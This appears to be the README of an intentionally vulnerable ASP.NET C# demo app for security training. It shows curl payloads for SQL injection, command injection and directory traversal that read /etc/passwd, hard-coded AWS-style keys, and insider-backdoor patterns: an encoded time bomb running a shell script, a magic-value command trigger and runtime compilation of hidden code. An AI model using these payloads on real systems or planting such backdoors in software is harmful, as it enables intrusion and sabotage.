# ASP.NET C\# Vulnerability Demo

## Setup
* cd ${workplace}
* docker-compose up --build
* {open browser and navigate to [http://localhost:5005](http://localhost:5005)}

## Vulnerability Demo

### SQL Injection:
- Command-Line Demo:
    ```sh
    $ curl -X GET -d "name=abc%27%20UNION%20SELECT%20Id,%20Username,%20Password%20FROM%20AspnetUsers%20--" http://localhost:5005/SearchStudentUnsecure
    
    # This will leak all of the registered users in the system:
    [{"id":0,"aspNetUserId":1,"lastName":"*_admin","firstName":"Admin","fullName":"*_admin, Admin"},
    {"id":0,"aspNetUserId":2,"lastName":"!_temp","firstName":"Temp","fullName":"!_temp, Temp"},
    {"id":0,"aspNetUserId":3,"lastName":"@_guest","firstName":"Guest","fullName":"@_guest, Guest"}]
    ```
    
### Remote code execution:
- Command-Line Demo:
    ```sh
    $ curl -X GET -d "name=cat /etc/passwd" http://localhost:5005/ExecCmdSecure
   
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nolog
    ```

### Directory traversal:

- Command-Line Demo:
    ```sh
    $ curl -X GET -d "name=../../etc/passwd" http://localhost:5005/dirTraversal
   
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nolog
    ```
http://localhost:5005/dirTraversal?name=${name}`

### Hard Coded credentials:
- [Code Snippet](https://gitlab.com/irobert0126/aspdotnet_csharp_vuln_demo/tree/master/SqlInjection/Controllers/OrderController.cs#L107):
    ```java
    [HttpGet("vulns")]
    public ActionResult DataLeakage(string login, string password, string encodedPath, string entityDocument) {
        String ACCESS_KEY_ID = "AKIA2E0A8F3B244C9986";
        String SECRET_KEY = "7CE556A3BC234CC1FF9E8A5C324C0BB70AA21B6D";
    ```
    
### Sensitive data leak:
- [Code Snippet](https://gitlab.com/irobert0126/aspdotnet_csharp_vuln_demo/tree/master/SqlInjection/Controllers/OrderController.cs#L114):
    ```java
    [HttpGet("vulns")]
    public ActionResult DataLeakage(string login, string password, string encodedPath, string entityDocument) {
        String ACCESS_KEY_ID = "AKIA2E0A8F3B244C9986";
        String SECRET_KEY = "7CE556A3BC234CC1FF9E8A5C324C0BB70AA21B6D";
            
        Console.WriteLine(" AWS Properties are " + ACCESS_KEY_ID + " and " + SECRET_KEY);
        Console.WriteLine(" Transactions Folder is " + txns_dir);
    ```
    
### Insider attack:
- [Code Snippet](https://gitlab.com/irobert0126/aspdotnet_csharp_vuln_demo/tree/master/SqlInjection/Controllers/HomeController.cs#L105):
1.  Time Bomb pattern
    ```java
    // RECIPE: Time Bomb pattern
    String command = "c2ggL3RtcC9zaGVsbGNvZGUuc2g=";
    ticking(command);
    ```
    
2. Magic Value leading to command injection
    ```java
    if (tracefn == "C4A938B6FE01E") {
        runtTimeExec(cmd);
    }
    ```

3. // RECIPE: Compiler Abuse Pattern
    ```java
    /*  string code = @"
        using System;
        namespace First
        {
            public class Program
            {
                public static void Main()
                {
                    Console.WriteLine('HAHAHA');
                }
            }
        }
    "; */

    String base64Str = "dXNpbmcgU3lzdGVtOwpuYW1lc3BhY2UgRmlyc3QKewogICBwdWJsaWMgY2xhc3MgUHJvZ3JhbSB7CiAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKCkgewogICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkhBSEFIQSIpOwogICAgICB9CiAgIH0KfQ==";
    ```
    
    ```java
    // Compile source file.
    CSharpCompilation compilation = CSharpCompilation.Create(
                assemblyName,
                syntaxTrees: new[] { syntaxTree },
                references: references,
                options: new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));
    ```
   
    ```java
    // Load and instantiate compiled class.
    Assembly assembly = AssemblyLoadContext.Default.LoadFromStream(ms);
    var type = assembly.GetType("First.Program");
    MethodInfo main = type.GetMethod("Main");
    main.Invoke(null, null);
    ```

### Business logic flaw
- [Code Snippet](https://gitlab.com/irobert0126/aspdotnet_csharp_vuln_demo/tree/master/SqlInjection/Controllers/OrderController.cs#L94):
    ```java
    [HttpPost("AddNewOrder")]
    public ActionResult AddNewOrderFlaw(string reader) {
        Order order = JsonConvert.DeserializeObject<Order>(reader);
        return Content(order.ToString());
    }
    ```
- Command-Line Demo:
    ```sh
    $ curl -X POST -d "reader={\"Id\":0,\"AspNetUserId\":1,\"LastName\":\"Xu\",\"FirstName\":\"Zhaoyan\",\"FullName\":\"Luke\'' Father\",\"AspNetUser\":null}" http://localhost:5005/AddNewOrder
    
      SqlInjection.Models.Order 
    ```
